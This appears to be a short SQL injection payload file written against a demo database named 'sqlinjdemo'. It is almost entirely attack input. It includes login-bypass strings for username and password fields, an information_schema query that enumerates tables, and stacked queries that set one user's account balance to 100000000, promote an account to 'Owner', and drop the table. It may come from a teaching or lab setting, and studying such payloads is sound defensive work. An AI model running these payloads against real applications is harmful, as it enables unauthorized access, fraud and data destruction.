
-- for 'login' and 'password'
x' or 1=1#

-- with proper name
Yegor' or '1

-- password is the same to user name
1' or '1' ='1

-- to get table name
SELECT table_name FROM information_schema.tables WHERE table_schema = 'sqlinjdemo';

--can update account balance 
x'or 1=1; update sqlinjdemo.sqlinj set accountbalance = '100000000' where username = 'Yegor';#--

--update type of an account 
x'or 1=1; update sqlinjdemo.sqlinj set type = 'Owner' where username = 'Yegor';#--

-- to drop a whole table 
x' or 1=1; drop table sqlinjdemo.sqlinj; #--




